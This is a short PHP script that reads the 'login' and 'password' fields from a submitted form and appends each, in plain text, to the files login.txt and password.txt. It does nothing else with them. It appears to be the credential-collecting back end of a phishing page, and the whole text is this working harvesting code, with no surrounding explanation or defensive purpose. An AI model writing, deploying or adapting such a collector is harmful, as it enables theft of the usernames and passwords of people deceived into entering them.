<?
$loggin = $_POST['login'];
$password = $_POST['password'];

$xs = fopen('login.txt', 'a');
fwrite($xs,"$loggin\n");
fclose($xs);
$xz = fopen('password.txt', 'a');
fwrite($xz,"$password\n");
fclose($xz);
?>